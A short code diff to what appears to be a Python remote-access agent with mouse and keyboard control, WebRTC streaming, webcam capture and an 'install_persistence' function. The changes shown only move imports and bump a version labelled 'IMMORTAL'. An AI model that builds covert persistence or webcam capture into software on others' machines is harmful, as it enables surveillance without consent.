@@ -18,10 +18,12 @@ from PIL import Image, ImageDraw, ImageFont
 from pynput.mouse import Controller as MouseController, Button
 from pynput.keyboard import Controller as KeyboardController, Key
 import av
+import cv2
+import numpy
 from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack, AudioStreamTrack, RTCRtpSender, RTCConfiguration, RTCIceServer
 from aiortc.contrib.media import MediaStreamTrack, MediaRelay
 
-AGENT_VERSION = "9.1.2-IMMORTAL"
+AGENT_VERSION = "9.1.3-IMMORTAL"
 
 def install_persistence():
     current_exe = sys.executable
@@ -293,7 +295,6 @@ class CameraVideoTrack(VideoStreamTrack):
         
         pts, time_base = await self.next_timestamp()
         
-        import cv2
         if self.cap is None:
             self.cap = cv2.VideoCapture(self.camera_index, cv2.CAP_DSHOW)
             
